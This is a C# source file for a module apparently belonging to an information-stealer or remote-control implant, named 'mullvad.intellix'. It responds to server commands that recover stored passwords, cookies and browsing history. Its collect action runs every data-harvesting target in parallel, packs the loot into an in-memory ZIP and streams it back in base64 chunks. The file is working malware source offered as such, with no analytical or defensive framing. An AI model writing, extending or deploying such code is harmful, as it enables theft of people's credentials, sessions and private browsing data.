using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Stealer;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;

namespace mullvad.Module.Intellix
{
    public sealed class IntellixClientModule
    {
        public static string ModuleId => "mullvad.intellix";

        // ZIP stays resident so the server can pull it chunk by chunk
        // (each response must stay under the 4 MB wire packet cap).
        private const  int                 ChunkSize = 1024 * 1024;
        private static byte[]              _zip;
        private static int                 _entryCount;
        private static readonly object     _lock     = new object();
        private static ITarget[]           _targets;

        private static ITarget[] Targets
        {
            get
            {
                if (_targets == null)
                {
                    lock (_lock)
                    {
                        if (_targets == null)
                        {
                            var types = Assembly.GetExecutingAssembly().GetTypes()
                                .Where(t => !t.IsAbstract && !t.IsInterface
                                         && typeof(ITarget).IsAssignableFrom(t))
                                .ToArray();
                            var list = new List<ITarget>();
                            foreach (var type in types)
                            {
                                try { list.Add((ITarget)Activator.CreateInstance(type)); }
                                catch { }
                            }
                            _targets = list.ToArray();
                        }
                    }
                }
                return _targets;
            }
        }

        public string Execute(string action, string payload)
        {
            try
            {
                switch (action)
                {
                    case "collect":    return Collect();
                    case "chunk":      return Chunk(payload);
                    case "passwords":  return PasswordRecovery.RecoverPasswords();
                    case "cookies":    return PasswordRecovery.RecoverCookies();
                    case "history":    return PasswordRecovery.RecoverHistory();
                    default:           return Err("Unknown action: " + action);
                }
            }
            catch (Exception ex) { return Err(ex.Message); }
        }

        // Runs every ITarget in the assembly in parallel (8-way, 3-minute hard cap —
        // partial results are taken on timeout), then appends the Counter summary.
        private string Collect()
        {
            lock (_lock)
            {
                using (var zip = new InMemoryZip())
                {
                    var counter = new Counter();
                    var targets = Targets;

                    var collectTask = Task.Run(delegate
                    {
                        Parallel.ForEach(targets, new ParallelOptions { MaxDegreeOfParallelism = 8 },
                            delegate (ITarget target)
                            {
                                try { target.Collect(zip, counter); }
                                catch { }
                            });
                    });

                    collectTask.Wait(180_000); // returns false on timeout — that's fine

                    counter.Collect(zip);

                    byte[] zipBytes = zip.ToArray();
                    _zip        = zipBytes;
                    _entryCount = zip.Count;
                }
            }

            int totalChunks = TotalChunks;
            return "{\"success\":true,\"entries\":" + _entryCount +
                   ",\"size\":"        + _zip.Length +
                   ",\"total_chunks\":" + totalChunks +
                   ",\"chunk_size\":"   + ChunkSize + "}";
        }

        private string Chunk(string payload)
        {
            if (_zip == null || _zip.Length == 0)
                return Err("Nothing collected yet");

            int idx;
            if (!int.TryParse((payload ?? "").Trim(), out idx))
                return Err("Bad chunk index");
            if (idx < 0 || idx >= TotalChunks)
                return Err("Chunk index out of range");

            int off = idx * ChunkSize;
            int len = Math.Min(ChunkSize, _zip.Length - off);
            byte[] chunk = new byte[len];
            Buffer.BlockCopy(_zip, off, chunk, 0, len);

            return "{\"success\":true,\"index\":" + idx +
                   ",\"data\":\"" + Convert.ToBase64String(chunk) + "\"}";
        }

        private int TotalChunks
        {
            get
            {
                int len = _zip == null ? 0 : _zip.Length;
                return Math.Max(1, (int)Math.Ceiling((double)len / ChunkSize));
            }
        }

        private static string Err(string msg)
            => "{\"success\":false,\"error\":\"" + msg.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "").Replace("\n", " ") + "\"}";
    }
}
